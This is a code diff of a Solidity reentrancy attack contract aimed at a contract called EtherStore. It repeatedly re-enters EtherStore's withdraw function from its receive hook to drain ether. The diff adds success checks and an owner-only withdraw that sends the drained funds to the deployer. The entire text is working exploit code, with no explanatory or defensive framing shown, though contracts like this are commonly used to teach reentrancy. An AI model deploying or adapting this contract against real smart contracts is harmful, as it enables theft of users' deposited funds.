@@ -2,28 +2,36 @@
 pragma solidity ^0.8.17;
 
 contract Attack {
-    address etherStoreAddress;
+    address private owner;
+    address private etherStoreAddress;
 
-    constructor(address _etherStoreAddress) payable {
+    constructor(address _etherStoreAddress) {
+        owner = msg.sender;
         etherStoreAddress = _etherStoreAddress;
     }
 
-    fallback() external {}
-
     receive() external payable {
         if (etherStoreAddress.balance >= 1 ether) {
-            etherStoreAddress.call(
+            (bool ok,) = etherStoreAddress.call(
                 abi.encodeWithSignature("withdraw(uint256)", 1 ether)
             );
+            assert(ok);
         }
     }
 
     function attackEtherStore() external payable {
-        etherStoreAddress.call{value: 1 ether}(
+        (bool ok,) = etherStoreAddress.call{value: 1 ether}(
             abi.encodeWithSignature("deposit()")
         );
-        etherStoreAddress.call(
+        (bool ok2,) = etherStoreAddress.call(
             abi.encodeWithSignature("withdraw(uint256)", 1 ether)
         );
+        assert(ok&&ok2);
+    }
+
+    function withdraw() external {
+        require(msg.sender == owner, "not owner");
+        (bool ok,) = payable(msg.sender).call{value: address(this).balance}("");
+        assert(ok);
     }
 }
